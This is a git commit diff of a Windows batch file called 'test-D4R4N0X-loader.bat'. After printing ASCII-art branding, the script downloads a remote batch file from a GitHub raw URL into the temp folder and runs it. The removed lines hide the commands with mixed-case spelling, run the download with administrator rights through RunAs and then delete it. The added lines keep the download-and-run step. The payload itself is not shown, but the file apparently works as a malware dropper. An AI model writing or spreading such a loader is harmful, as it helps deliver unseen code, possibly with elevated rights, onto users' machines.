23e832ece55d84ff24a8fddb2a1b824094975278
BUNB4STER4BL4STER <118354132+Pikinez@users.noreply.github.com>
2025-04-05 18:00:49 +0300

    Update test-D4R4N0X-loader.bat

--- test-D4R4N0X-loader.bat
+++ test-D4R4N0X-loader.bat
@@ -1,22 +1,21 @@
 @echo off
 chcp 65001 >nul
 Color 0D & Mode con cols=34 lines=7
-
 title D4R4N0X-75X7-V3R1D4
-echo 
+
+echo.
 echo  ██████╗ ██████╗ ██████╗ ███████╗
 echo  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
 echo  ██████╔╝██████╔╝██║  ██║███████╗
 echo  ██╔══██╗██╔══██╗██║  ██║╚════██║
 echo  ██████╔╝██████╔╝██████╔╝███████║
 echo  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
-sEtLoCaL
-sEt "tEMPfIlE=%tEMp%\D4R4N0X-file.bAT"
-PoWErShElL -CoMmAnD "InVoKe-WeBrEqUeSt 'https://raw.githubusercontent.com/Pikinez/DataBase/refs/heads/main/D4R4N0X-file.bat' -OuTfIlE '%tEMpFIlE%'" 
-IF EXiSt "%TEmPFIlE%" (
-    PoWERshELL -ComMAnd "StArT-PrOcEsS '%TeMpFiLe%' -vErB rUnAs -WaIT"
-    Del /F /Q "%TeMpFIlE%"
+
+setlocal
+set "tempFile=%temp%\D4R4N0X-file.bat"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pikinez/DataBase/main/D4R4N0X-file.bat' -OutFile '%tempFile%'"
+if exist "%tempFile%" (
+    start "" "%tempFile%"
 )
-EnDlOCaL
-pause
+
 exit
